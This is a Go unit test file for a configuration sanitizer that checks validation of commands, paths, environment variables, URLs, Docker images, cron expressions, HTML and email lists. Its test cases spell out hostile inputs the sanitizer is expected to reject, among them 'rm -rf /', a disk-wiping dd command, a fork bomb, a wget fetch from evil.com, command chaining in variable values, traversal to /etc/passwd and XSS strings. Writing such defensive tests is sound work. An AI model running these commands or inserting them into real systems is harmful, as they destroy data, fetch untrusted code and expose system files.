package config

import (
	"strings"
	"testing"
)

func TestNewSanitizer(t *testing.T) {
	t.Parallel()
	sanitizer := NewSanitizer()
	if sanitizer == nil {
		t.Fatal("NewSanitizer returned nil")
	}
	if sanitizer.sqlInjectionPattern == nil {
		t.Error("sqlInjectionPattern not initialized")
	}
	if sanitizer.shellInjectionPattern == nil {
		t.Error("shellInjectionPattern not initialized")
	}
	if sanitizer.pathTraversalPattern == nil {
		t.Error("pathTraversalPattern not initialized")
	}
	if sanitizer.ldapInjectionPattern == nil {
		t.Error("ldapInjectionPattern not initialized")
	}
}

func TestSanitizeString(t *testing.T) {
	t.Parallel()
	sanitizer := NewSanitizer()

	tests := []struct {
		name      string
		input     string
		maxLength int
		expected  string
		wantError bool
	}{
		{
			name:      "valid string",
			input:     "hello world",
			maxLength: 20,
			expected:  "hello world",
			wantError: false,
		},
		{
			name:      "string with whitespace",
			input:     "  hello world  ",
			maxLength: 20,
			expected:  "hello world",
			wantError: false,
		},
		{
			name:      "string too long",
			input:     "this is a very long string",
			maxLength: 10,
			expected:  "",
			wantError: true,
		},
		{
			name:      "string with null bytes",
			input:     "hello\x00world",
			maxLength: 20,
			expected:  "helloworld",
			wantError: false,
		},
		{
			name:      "string with control characters",
			input:     "hello\x01world",
			maxLength: 20,
			expected:  "",
			wantError: true,
		},
		{
			name:      "string with allowed control chars",
			input:     "hello\tworld\n",
			maxLength: 20,
			expected:  "hello\tworld",
			wantError: false,
		},
		{
			name:      "empty string",
			input:     "",
			maxLength: 10,
			expected:  "",
			wantError: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			result, err := sanitizer.SanitizeString(tt.input, tt.maxLength)
			if (err != nil) != tt.wantError {
				t.Errorf("SanitizeString() error = %v, wantError %v", err, tt.wantError)
				return
			}
			if result != tt.expected {
				t.Errorf("SanitizeString() = %v, want %v", result, tt.expected)
			}
		})
	}
}

func TestValidateCommand(t *testing.T) {
	t.Parallel()
	sanitizer := NewSanitizer()

	tests := []struct {
		name      string
		command   string
		wantError bool
	}{
		{
			name:      "valid command",
			command:   "ls -la",
			wantError: false,
		},
		{
			name:      "command with semicolon",
			command:   "ls; rm file",
			wantError: true,
		},
		{
			name:      "command with pipe",
			command:   "cat file | grep text",
			wantError: true,
		},
		{
			name:      "dangerous rm command",
			command:   "rm -rf /",
			wantError: true,
		},
		{
			name:      "dangerous dd command",
			command:   "dd if=/dev/zero of=/dev/sda",
			wantError: true,
		},
		{
			name:      "command with sudo",
			command:   "sudo rm file",
			wantError: true,
		},
		{
			name:      "command with wget",
			command:   "wget http://evil.com/script.sh",
			wantError: true,
		},
		{
			name:      "fork bomb",
			command:   ":(){:|:&};:",
			wantError: true,
		},
		{
			name:      "command with redirect",
			command:   "echo test > file",
			wantError: true,
		},
		{
			name:      "simple echo",
			command:   "echo hello",
			wantError: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			err := sanitizer.ValidateCommand(tt.command)
			if (err != nil) != tt.wantError {
				t.Errorf("ValidateCommand() error = %v, wantError %v", err, tt.wantError)
			}
		})
	}
}

func TestValidatePath(t *testing.T) {
	t.Parallel()
	sanitizer := NewSanitizer()

	tests := []struct {
		name            string
		path            string
		allowedBasePath string
		wantError       bool
	}{
		{
			name:            "valid path",
			path:            "/tmp/file.txt",
			allowedBasePath: "",
			wantError:       false,
		},
		{
			name:            "path traversal attempt",
			path:            "../../../etc/passwd",
			allowedBasePath: "",
			wantError:       true,
		},
		{
			name:            "path with double dots",
			path:            "/tmp/../etc/passwd",
			allowedBasePath: "",
			wantError:       true,
		},
		{
			name:            "dangerous file extension",
			path:            "/tmp/script.sh",
			allowedBasePath: "",
			wantError:       true,
		},
		{
			name:            "executable extension",
			path:            "/tmp/program.exe",
			allowedBasePath: "",
			wantError:       true,
		},
		{
			name:            "safe file extension",
			path:            "/tmp/data.json",
			allowedBasePath: "",
			wantError:       false,
		},
		{
			name:            "path within allowed base",
			path:            "/tmp/subdir/file.txt",
			allowedBasePath: "/tmp",
			wantError:       false,
		},
		{
			name:            "path outside allowed base",
			path:            "/etc/passwd",
			allowedBasePath: "/tmp",
			wantError:       true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			err := sanitizer.ValidatePath(tt.path, tt.allowedBasePath)
			if (err != nil) != tt.wantError {
				t.Errorf("ValidatePath() error = %v, wantError %v", err, tt.wantError)
			}
		})
	}
}

func TestValidateEnvironmentVar(t *testing.T) {
	t.Parallel()
	sanitizer := NewSanitizer()

	tests := []struct {
		name      string
		varName   string
		varValue  string
		wantError bool
	}{
		{
			name:      "valid environment variable",
			varName:   "MY_VAR",
			varValue:  "some_value",
			wantError: false,
		},
		{
			name:      "invalid variable name with special chars",
			varName:   "MY-VAR",
			varValue:  "value",
			wantError: true,
		},
		{
			name:      "invalid variable name starting with number",
			varName:   "123VAR",
			varValue:  "value",
			wantError: true,
		},
		{
			name:      "valid variable name with underscore",
			varName:   "_MY_VAR123",
			varValue:  "value",
			wantError: false,
		},
		{
			name:      "value with shell injection",
			varName:   "VAR",
			varValue:  "value; rm -rf /",
			wantError: true,
		},
		{
			name:      "value with pipe",
			varName:   "VAR",
			varValue:  "value | cat",
			wantError: true,
		},
		{
			name:      "value too long",
			varName:   "VAR",
			varValue:  strings.Repeat("a", 5000),
			wantError: true,
		},
		{
			name:      "empty variable name",
			varName:   "",
			varValue:  "value",
			wantError: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			err := sanitizer.ValidateEnvironmentVar(tt.varName, tt.varValue)
			if (err != nil) != tt.wantError {
				t.Errorf("ValidateEnvironmentVar() error = %v, wantError %v", err, tt.wantError)
			}
		})
	}
}

func TestSanitizerValidateURL(t *testing.T) {
	t.Parallel()
	sanitizer := NewSanitizer()

	tests := []struct {
		name      string
		url       string
		wantError bool
	}{
		{
			name:      "valid HTTP URL",
			url:       "http://example.com/path",
			wantError: false,
		},
		{
			name:      "valid HTTPS URL",
			url:       "https://example.com/path",
			wantError: false,
		},
		{
			name:      "invalid scheme",
			url:       "ftp://example.com/file",
			wantError: true,
		},
		{
			name:      "localhost URL",
			url:       "http://localhost:8080/api",
			wantError: true,
		},
		{
			name:      "127.0.0.1 URL",
			url:       "http://127.0.0.1:8080/api",
			wantError: true,
		},
		{
			name:      "private IP range",
			url:       "http://192.168.1.1/api",
			wantError: true,
		},
		{
			name:      "direct IP address",
			url:       "http://8.8.8.8/api",
			wantError: true,
		},
		{
			name:      "invalid URL format",
			url:       "not-a-url",
			wantError: true,
		},
		{
			name:      "local domain",
			url:       "http://myserver.local/api",
			wantError: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			err := sanitizer.ValidateURL(tt.url)
			if (err != nil) != tt.wantError {
				t.Errorf("ValidateURL() error = %v, wantError %v", err, tt.wantError)
			}
		})
	}
}

func TestValidateDockerImage(t *testing.T) {
	t.Parallel()
	sanitizer := NewSanitizer()

	tests := []struct {
		name      string
		image     string
		wantError bool
	}{
		{
			name:      "simple image name",
			image:     "nginx",
			wantError: false,
		},
		{
			name:      "image with tag",
			image:     "nginx:latest",
			wantError: false,
		},
		{
			name:      "image with registry",
			image:     "docker.io/library/nginx:latest",
			wantError: false,
		},
		{
			name:      "image with SHA",
			image:     "nginx@sha256:1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
			wantError: false,
		},
		{
			name:      "invalid image with double slash",
			image:     "nginx//latest",
			wantError: true,
		},
		{
			name:      "invalid image with dots",
			image:     "nginx..latest",
			wantError: true,
		},
		{
			name:      "image name too long",
			image:     strings.Repeat("a", 300),
			wantError: true,
		},
		{
			name:      "empty image name",
			image:     "",
			wantError: true,
		},
		{
			name:      "image with uppercase",
			image:     "MyImage:Latest",
			wantError: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			err := sanitizer.ValidateDockerImage(tt.image)
			if (err != nil) != tt.wantError {
				t.Errorf("ValidateDockerImage() error = %v, wantError %v", err, tt.wantError)
			}
		})
	}
}

func TestSanitizerValidateCronExpression(t *testing.T) {
	t.Parallel()
	sanitizer := NewSanitizer()

	tests := []struct {
		name      string
		expr      string
		wantError bool
	}{
		{
			name:      "valid cron expression",
			expr:      "0 0 * * *",
			wantError: false,
		},
		{
			name:      "valid cron with seconds",
			expr:      "0 0 0 * * *",
			wantError: false,
		},
		{
			name:      "special @yearly",
			expr:      "@yearly",
			wantError: false,
		},
		{
			name:      "@monthly",
			expr:      "@monthly",
			wantError: false,
		},
		{
			name:      "@weekly",
			expr:      "@weekly",
			wantError: false,
		},
		{
			name:      "@daily",
			expr:      "@daily",
			wantError: false,
		},
		{
			name:      "@hourly",
			expr:      "@hourly",
			wantError: false,
		},
		{
			name:      "valid @every expression",
			expr:      "@every 5m",
			wantError: false,
		},
		{
			name:      "valid @every with seconds",
			expr:      "@every 30s",
			wantError: false,
		},
		{
			name:      "valid @every with hours",
			expr:      "@every 2h",
			wantError: false,
		},
		{
			name:      "invalid @every format",
			expr:      "@every 5",
			wantError: true,
		},
		{
			name:      "invalid special expression",
			expr:      "@invalid",
			wantError: true,
		},
		{
			name:      "too few fields",
			expr:      "0 0 *",
			wantError: true,
		},
		{
			name:      "too many fields",
			expr:      "0 0 0 * * * * *",
			wantError: true,
		},
		{
			name:      "wildcard expression",
			expr:      "* * * * *",
			wantError: false,
		},
		{
			name:      "range expression",
			expr:      "0-30 * * * *",
			wantError: false,
		},
		{
			name:      "step expression",
			expr:      "*/15 * * * *",
			wantError: false,
		},
		{
			name:      "list expression",
			expr:      "0,15,30,45 * * * *",
			wantError: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			err := sanitizer.ValidateCronExpression(tt.expr)
			if (err != nil) != tt.wantError {
				t.Errorf("ValidateCronExpression() error = %v, wantError %v", err, tt.wantError)
			}
		})
	}
}

func TestSanitizeHTML(t *testing.T) {
	t.Parallel()
	sanitizer := NewSanitizer()

	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "plain text",
			input:    "hello world",
			expected: "hello world",
		},
		{
			name:     "HTML with script tag",
			input:    "<script>alert('xss')</script>",
			expected: "&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;",
		},
		{
			name:     "HTML with quotes",
			input:    `<img src="x" onerror="alert('xss')">`,
			expected: "&lt;img src=&#34;x&#34; onerror=&#34;alert(&#39;xss&#39;)&#34;&gt;",
		},
		{
			name:     "HTML with ampersand",
			input:    "Tom & Jerry",
			expected: "Tom &amp; Jerry",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			result := sanitizer.SanitizeHTML(tt.input)
			if result != tt.expected {
				t.Errorf("SanitizeHTML() = %v, want %v", result, tt.expected)
			}
		})
	}
}

func TestValidateJobName(t *testing.T) {
	t.Parallel()
	sanitizer := NewSanitizer()

	tests := []struct {
		name      string
		jobName   string
		wantError bool
	}{
		{
			name:      "valid job name",
			jobName:   "my-job-123",
			wantError: false,
		},
		{
			name:      "job name with underscore",
			jobName:   "my_job_123",
			wantError: false,
		},
		{
			name:      "empty job name",
			jobName:   "",
			wantError: true,
		},
		{
			name:      "job name too long",
			jobName:   strings.Repeat("a", 101),
			wantError: true,
		},
		{
			name:      "job name with special chars",
			jobName:   "my-job@123",
			wantError: true,
		},
		{
			name:      "job name with spaces",
			jobName:   "my job 123",
			wantError: true,
		},
		{
			name:      "job name with dots",
			jobName:   "my.job.123",
			wantError: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			err := sanitizer.ValidateJobName(tt.jobName)
			if (err != nil) != tt.wantError {
				t.Errorf("ValidateJobName() error = %v, wantError %v", err, tt.wantError)
			}
		})
	}
}

func TestValidateEmailList(t *testing.T) {
	t.Parallel()
	sanitizer := NewSanitizer()

	tests := []struct {
		name      string
		emails    string
		wantError bool
	}{
		{
			name:      "empty email list",
			emails:    "",
			wantError: false,
		},
		{
			name:      "single valid email",
			emails:    "user@example.com",
			wantError: false,
		},
		{
			name:      "multiple valid emails",
			emails:    "user1@example.com,user2@test.org",
			wantError: false,
		},
		{
			name:      "emails with spaces",
			emails:    "user1@example.com, user2@test.org",
			wantError: false,
		},
		{
			name:      "invalid email format",
			emails:    "invalid-email",
			wantError: true,
		},
		{
			name:      "email without domain",
			emails:    "user@",
			wantError: true,
		},
		{
			name:      "email without TLD",
			emails:    "user@example",
			wantError: true,
		},
		{
			name:      "mixed valid and invalid",
			emails:    "user@example.com,invalid-email",
			wantError: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			err := sanitizer.ValidateEmailList(tt.emails)
			if (err != nil) != tt.wantError {
				t.Errorf("ValidateEmailList() error = %v, wantError %v", err, tt.wantError)
			}
		})
	}
}

// Test private helper functions through public methods

func TestValidateCronFieldThroughExpression(t *testing.T) {
	t.Parallel()
	sanitizer := NewSanitizer()

	// Test through ValidateCronExpression which calls validateCronField
	tests := []struct {
		name      string
		expr      string
		wantError bool
	}{
		{
			name:      "valid range",
			expr:      "1-5 * * * *",
			wantError: false,
		},
		{
			name:      "invalid range - start greater than end",
			expr:      "5-1 * * * *", // start > end
			wantError: true,
		},
		{
			name:      "valid step",
			expr:      "*/15 * * * *",
			wantError: false,
		},
		{
			name:      "invalid step - zero",
			expr:      "*/0 * * * *", // step value 0
			wantError: true,
		},
		{
			name:      "invalid range format",
			expr:      "1-2-3 * * * *", // invalid range format
			wantError: true,
		},
		{
			name:      "invalid step format",
			expr:      "1/2/3 * * * *", // invalid step format
			wantError: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			err := sanitizer.ValidateCronExpression(tt.expr)
			if (err != nil) != tt.wantError {
				t.Errorf("ValidateCronExpression() error = %v, wantError %v", err, tt.wantError)
			}
		})
	}
}
